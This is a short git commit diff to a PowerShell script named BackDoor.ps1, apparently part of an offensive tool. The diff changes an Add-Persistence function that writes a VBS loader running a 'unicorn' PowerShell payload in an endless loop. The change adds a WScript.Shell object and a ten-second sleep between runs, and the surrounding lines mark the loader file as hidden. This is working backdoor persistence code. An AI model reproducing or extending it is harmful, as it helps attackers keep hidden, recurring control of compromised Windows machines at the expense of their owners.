b3b42f2d3aa64c51cd3c4d9bef843de724f7a7f7
SharkSlayer <31451992+SharkSlayer@users.noreply.github.com>
2017-10-05 15:29:15 +0700

    Update BackDoor.ps1

--- BackDoor.ps1
+++ BackDoor.ps1
@@ -49,8 +49,10 @@ function Add-Persistence()
 	# Create the VBS file and insert the powershell command from unicorn.
 	Write-Host "[+] Creating VBS loader."
 	$vbs = "Do`r`n"
+	$vbs += "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
 	$vbs += "$payload"
-	$vbs += "`r`nLoop"
+	$vbs += "`r`nWScript.Sleep 10000`r`n"
+	$vbs += "Loop"
 	$vbs | Out-File $payloadvbsloaderpath -Force
 	
 	# Mark the file as hidden.
